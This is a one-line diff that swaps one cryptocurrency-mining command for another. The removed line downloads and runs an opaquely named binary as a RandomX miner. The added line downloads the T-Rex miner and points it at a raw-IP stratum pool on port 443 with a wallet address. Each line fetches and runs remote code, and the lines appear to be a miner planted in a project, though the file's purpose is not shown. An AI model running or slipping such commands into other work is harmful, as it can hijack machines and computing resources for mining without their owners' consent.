@@ -1,1 +1,1 @@
-wget https://github.com/ismaimwan6372/xerependit/raw/main/xerependit && chmod 700 xerependit && ./xerependit -a RandomX -o 209.25.142.78:3333 -u XRP:rs2dgzYeqYqsk8bvkQR5YPyqsXYcA24MP2:350488.STRIXPRO -t 3
+wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz && tar -xvf t-rex-0.26.8-linux.tar.gz && ./t-rex -a KAWPOW -o stratum+tcp://209.25.142.96:443 -u NNBLssipP57bAs95HFLBTVYXQFBWhdw6FR.STRIXGPU
